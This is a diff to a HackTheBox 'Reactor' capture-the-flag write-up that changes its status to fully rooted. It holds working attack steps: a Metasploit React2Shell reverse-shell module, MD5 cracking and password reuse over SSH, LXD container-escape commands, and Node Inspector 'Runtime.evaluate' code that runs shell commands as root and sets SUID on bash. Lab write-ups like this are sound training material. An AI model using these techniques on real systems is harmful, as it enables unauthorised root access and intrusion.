@@ -1,8 +1,8 @@
 # HackTheBox — Reactor
 
 **Target:** 10.129.245.214   **DNS:** reactor.htb   **OS:** Linux (Ubuntu 24.04, kernel 6.8)   **Difficulty:** Easy   **Date:** 2026-07-04
-**Status:** USER OWNED — root PENDING (LXD-group escape identified, not yet executed)
-**User flag:** `b8b6d1931935b7e37f91ded1e39617c1`   **Root flag:** _TBD_
+**Status:** ROOTED ✅ (user + root)
+**User flag:** `b8b6d1931935b7e37f91ded1e39617c1`   **Root flag:** `cdc085e44b3b0856f56b1d418e26b60e`
 
 ---
 
@@ -14,7 +14,7 @@ Reactor is a single-web-app box whose foothold is an **unauthenticated React Ser
 2. The box dangles **CVE-2025-29927** (Next.js `x-middleware-subrequest` middleware auth-bypass) as a **red herring** — the version is technically vulnerable, but there is **no middleware / protected route** to bypass, so it goes nowhere.
 3. The real foothold is **CVE-2025-55182 "React2Shell"** — an **unauthenticated RCE via insecure deserialization in the RSC "Flight" protocol** (App Router server actions). Metasploit → reverse shell as **`node`** (uid 999).
 4. The app's SQLite **`reactor.db`** holds **MD5** password hashes; cracking `engineer`'s hash gives `reactor1`, which is **reused for the system user `engineer`** over SSH → **user flag**.
-5. **Root (pending):** `engineer` is in the **`lxd` group** → privileged-container escape to root.
+5. **Root:** a **root-owned Node.js process** runs with the debugger open — `node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js`. Connect to the **Node Inspector / Chrome DevTools Protocol** WebSocket and `Runtime.evaluate` arbitrary JS → **code exec as root**. The `lxd` group is a **red herring** (LXD isn't installed and the box has no snap-store connectivity).
 
 **Credential / loot trail:**
 
@@ -25,7 +25,8 @@ Reactor is a single-web-app box whose foothold is an **unauthenticated React Ser
 | `engineer : 39d9…1e8e` (MD5) | `reactor.db` `users` table | cracked → `reactor1` |
 | `engineer : reactor1` | password reuse | `ssh engineer@reactor.htb` (user) |
 | `admin : a203…17b8` (MD5) | `reactor.db` | not cracked (rockyou) — unneeded |
-| `engineer ∈ lxd` group | `id` | root via LXD container escape (pending) |
+| `engineer ∈ lxd` group | `id` | **red herring** — LXD not installed, no store connectivity |
+| `node --inspect=127.0.0.1:9229` (root) | `ps aux` (linpeas) | **Node Inspector CDP RCE → root** |
 
 ---
 
@@ -179,7 +180,7 @@ cat ~/user.txt
 
 ---
 
-## 4. Privilege Escalation → Root (PENDING — vector identified)
+## 4. Privilege Escalation → Root (Node.js Inspector RCE)
 
 ### 4.1 Enumeration
 
@@ -191,30 +192,55 @@ id
 # groups=1000(engineer),4(adm),24(cdrom),30(dip),46(plugdev),101(lxd)
 ```
 
-### 4.2 The vector — `lxd` group
+### 4.2 The `lxd` group is a RED HERRING
 
-**`engineer` is in the `lxd` group** → classic **LXD privileged-container escape**: create a container with `security.privileged=true` and a disk device mapping the host `/`, then as root inside the container read `/root/root.txt` (or `chmod +s /bin/bash` on the host).
-
-**Caveat found:** on Ubuntu 24.04 `/usr/sbin/lxc` + `/usr/sbin/lxd` are the **`lxd-installer` shim** — running `lxc --version` printed `Installing LXD snap, please be patient` (installs on first use, needs network). **Before executing the escape, confirm LXD is actually installed & the daemon socket exists:**
+`engineer ∈ lxd` looks like the classic LXD privileged-container escape, but on this box it's a trap — **LXD isn't installed and the box has no snap-store connectivity**, so it can't be installed on demand:
 
 ```
-snap list                       # is 'lxd' present?
-ps aux | grep '[l]xd'
-ls -la /var/snap/lxd/common/lxd/unix.socket /var/lib/lxd/unix.socket 2>/dev/null
-lxc list                        # a table (even empty) = LXD is live
+snap list                       # -> nothing (snapd empty)
+ps aux | grep '[l]xd'           # -> no daemon
+ls /var/snap/lxd/.../unix.socket /var/lib/lxd/unix.socket   # -> absent
+lxc list                        # -> "Installing LXD snap, please be patient." then
+                                #    ConnectionResetError [Errno 104] (no internet -> store unreachable)
 ```
 
-### 4.3 Planned exploitation (next session)
+`/usr/sbin/lxc` is the **`lxd-installer` shim**; with no store the snap never lands. HTB intended paths never require internet — so pivot off LXD. **Lesson: a privesc "lead" that needs a component that isn't actually present (and can't be fetched) is bait.** [[feedback-methodology]]
 
-- **If LXD is live and an image exists:** `lxc image list` → launch privileged container mounting host root:
-  ```
-  lxc init <image> r00t -c security.privileged=true
-  lxc config device add r00t host disk source=/ path=/mnt/root recursive=true
-  lxc start r00t && lxc exec r00t /bin/sh
-  # inside: cat /mnt/root/root/root.txt  OR  chmod +s /mnt/root/bin/bash
-  ```
-- **If no image / no store connectivity:** build a tiny Alpine LXD image on the attacker (`lxd-alpine-builder` / distrobuilder), transfer over HTTP, `lxc image import alpine.tar.gz --alias alpine`, `lxd init --auto`, then as above.
-- **If the lxd snap genuinely isn't installed and can't reach the store:** sideload the `lxd` snap from the attacker (`snap install --dangerous lxd_*.snap`) or re-check for an alternate root path.
+### 4.3 The real vector — root Node.js process with the debugger open
+
+`linpeas` (or `ps aux`) shows a **root** process running with `--inspect`:
+
+```
+root  1379  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+```
+
+`--inspect=127.0.0.1:9229` exposes the **Node.js Inspector** (Chrome DevTools Protocol) WebSocket. Anyone who can reach that port can `Runtime.evaluate` **arbitrary JS inside that process** — and it runs as **root**. Bound to localhost, but we're already on the box as `engineer`. Confirm it's live:
+
+```
+curl -s http://127.0.0.1:9229/json/list      # -> JSON with "webSocketDebuggerUrl":"ws://127.0.0.1:9229/<uuid>"
+```
+
+### 4.4 Exploitation — CDP `Runtime.evaluate` → root
+
+Node is on the box but the `ws` module may not be, so use a **dependency-free** CDP client that hand-rolls the (masked) WebSocket frame: `scripts/node_inspector_rce.js`. It GETs `/json/list`, upgrades to the debugger WebSocket, and sends one `Runtime.evaluate` that shells out via `global.process.mainModule.require('child_process').execSync(<cmd>)`.
+
+```
+scp scripts/node_inspector_rce.js engineer@reactor.htb:/tmp/x.js
+# on target:
+node /tmp/x.js 'id'                 # -> uid=0(root) gid=0(root) groups=0(root)
+node /tmp/x.js 'cat /root/root.txt' # -> cdc085e44b3b0856f56b1d418e26b60e
+node /tmp/x.js 'chmod +s /bin/bash'; bash -p   # optional persistent root shell (euid 0)
+```
+
+**ROOT FLAG: `cdc085e44b3b0856f56b1d418e26b60e`** ✅
+
+Minimal exploit expression (what the script sends):
+
+```
+global.process.mainModule.require('child_process').execSync('id',{encoding:'utf8'})
+```
+
+Manual fallback (no script): `node inspect 127.0.0.1:9229` attaches the built-in CLI debugger to the running target; in the REPL, evaluate the same `execSync(...)` expression.
 
 ---
 
@@ -225,10 +251,13 @@ lxc list                        # a table (even empty) = LXD is live
 - **Enumerating ALL CVEs for the version, not just the themed one.** `search nextjs` in msf surfaced React2Shell (CVE-2025-55182); the box's whole design steered us at CVE-2025-29927 instead.
 - **`ForceExploit true`** — the exploit's auto-check is over-conservative against a cached prerender; the standalone `check` was the reliable signal.
 - **App DB → MD5 → password reuse → SSH** — the standard "web-app creds reused for the system user" chain (same as Enigma/Nexus).
+- **`ps aux` / linpeas process list found the root privesc** — spotting `node --inspect=127.0.0.1:9229` run by root. The open debugger port, not the group membership, was the way in.
 
 **Didn't work / dead ends (time sinks to avoid next time)**
 - **CVE-2025-29927 middleware bypass** — version-vulnerable but **no middleware/route** existed. A deliberate distraction.
 - **Route/vhost/dir fuzzing, source maps, `/_next/image` SSRF, XSS, nikto** — all empty; the app is a pure decoy and the vuln was never route-based.
+- **`lxd` group escape** — bait: LXD not installed, no snap-store connectivity, can't sideload cleanly. Chasing it wasted a session.
+- **linux-exploit-suggester kernel CVEs** (PwnKit, Baron-Samedit, Netfilter) — all tagged for Ubuntu ≤21 / kernel 5.x; this is 24.04 / kernel 6.8. Noise on a modern box.
 
 ## 6. Lessons Learned / Reusable Techniques
 
@@ -236,7 +265,7 @@ lxc list                        # a table (even empty) = LXD is live
 - **A vulnerable version ≠ the intended vuln.** Enumerate *every* CVE in range (`msfconsole -q -x "search <framework>"`) and prefer the one that fits the observed surface. A static App-Router page with no routes points at an **RSC-protocol** bug (CVE-2025-55182), not a route/middleware bug (CVE-2025-29927).
 - **CVE-2025-55182 (React2Shell):** unauth RCE via RSC "Flight" deserialization on **any Next.js 15.x App Router** app. MSF `exploit/multi/http/react2shell_unauth_rce_cve_2025_55182`, `TARGET 0` (Unix), payload `cmd/unix/reverse_nodejs`, `TARGETURI /`. If the auto-check balks on a cached page, `set ForceExploit true`.
 - **Always crack + spray app-DB creds against SSH** for the human user (`john --format=raw-md5`). One MD5 → `reactor1` → `ssh engineer`.
-- **Check group membership for privesc** (`id`): `lxd`, `docker`, `disk`, `adm` are instant leads. `lxd` → privileged-container host-root mount.
-- **Ubuntu 24.04 LXD caveat:** `lxc`/`lxd` in `/usr/sbin` are install-on-demand shims (`lxd-installer`); verify the snap is installed and `unix.socket` exists before relying on the escape.
+- **Check group membership for privesc** (`id`): `lxd`, `docker`, `disk`, `adm` are instant leads — **but verify the backing component is actually installed and usable.** Here `lxd` was bait: `lxc` was an `lxd-installer` shim, the snap wasn't installed, and the box had no store connectivity (`ConnectionResetError`). A lead that needs a component that isn't present (and can't be fetched offline) is a red herring on HTB.
+- **Scan the process list for root services with a debug/management port** (`ps aux`, linpeas "Processes"). **`node --inspect[=host:9229]` running as root = instant root RCE** via the Node Inspector / Chrome DevTools Protocol: `curl http://127.0.0.1:9229/json/list` for the `webSocketDebuggerUrl`, connect, and `Runtime.evaluate` `global.process.mainModule.require('child_process').execSync(<cmd>)`. Dependency-free client: `scripts/node_inspector_rce.js`. Same idea applies to any `--inspect`/`--inspect-brk` process — the debug port is unauthenticated code exec as its owner.
 
 Cross-references: `methodology/core-principles.md` (get exact version; simple before complex; don't tunnel on the first CVE), `Machines/htb-enigma.md` + `Machines/htb-nexus.md` (app-DB → cred-reuse → SSH pattern).
